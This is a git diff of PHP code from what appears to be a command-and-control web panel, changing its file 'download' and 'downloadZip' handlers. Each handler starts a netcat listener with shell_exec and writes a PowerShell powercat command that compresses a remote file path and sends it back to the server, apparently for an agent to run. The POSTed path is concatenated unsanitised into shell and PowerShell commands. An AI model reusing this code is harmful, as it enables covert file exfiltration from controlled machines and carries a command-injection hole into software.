@@ -116,13 +116,12 @@ if (isset($_POST['action'])) {
             error_log("Received download action");
             session_write_close();
             $filePath = $_POST['command'];
-            shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/" . mb_basename($filePath) ." < /dev/null &");
+            shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/" . mb_basename($filePath) ." &");
             error_log(mb_basename($filePath));
             sleep(1);
             // $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' 
             //     . $fileTransferPort . ' -i ' . $filePath . '}';
-            $cmd ='. ' . $powercatFolder . '/powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' 
-            . $fileTransferPort . ' -i ' . $filePath;
+            $cmd ='. ' . $powercatFolder . '/powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $filePath;
             $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
             fwrite($handle, $cmd);
             fclose($handle);  
@@ -133,15 +132,15 @@ if (isset($_POST['action'])) {
             error_log("Received downloadZip action");
             session_write_close();
             $filePath = $_POST['command'];
-            $zipPath = "./" . mb_basename($filePath) . ".zip";
             shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/" . mb_basename($filePath) .".zip &");
             sleep(1);
             // $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; Compress-Archive -Path ' . $filePath . '-DestinationPath ' . $zipPath . '; 
             //     powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $zipPath . '};';
             // $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; Compress-Archive -Path ' . $filePath . '-DestinationPath ' . $zipPath . '; 
                 // powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $zipPath . '; Remove-Item -Path ' . $zipPath . '-Force;}';
-            $cmd = '. ' . $powercatFolder . '/powercat.ps1; Compress-Archive -Path ' . $filePath . '-DestinationPath ' . $zipPath . '; 
-                powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $zipPath . '; Remove-Item -Path ' . $zipPath . '-Force;';
+            // $cmd = '. ' . $powercatFolder . '/powercat.ps1; Compress-Archive -Path ' . $filePath . '-DestinationPath ' . $zipPath . '; 
+            //     powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $zipPath . '; Remove-Item -Path ' . $zipPath . '-Force;';
+            $cmd = '. ' . $powercatFolder . '/powercat.ps1; Compress-Archive -Path ' . $filePath . ' -DestinationPath ' . $filePath . '.zip; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $filePath . '.zip; Remove-Item -Path ' . $filePath . '.zip -Force;';
             $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
             fwrite($handle, $cmd);
             fclose($handle);  
